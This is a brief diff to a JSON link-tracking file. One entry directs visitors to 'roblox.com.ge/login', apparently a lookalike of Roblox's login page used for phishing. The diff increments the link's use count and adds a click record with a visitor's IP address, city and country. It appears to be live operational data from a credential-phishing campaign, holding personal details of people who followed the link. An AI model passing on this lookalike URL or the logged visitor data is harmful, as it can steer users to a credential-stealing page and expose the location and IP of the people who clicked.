@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1066,
+    "useCount": 1067,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8648,6 +8648,14 @@
         "city": "Rio Bonito",
         "flag": "🇧🇷",
         "countryCode": "BR"
+      },
+      {
+        "timestamp": 1777245778442,
+        "ip": "166.198.119.140",
+        "country": "United States",
+        "city": "Manhattan",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
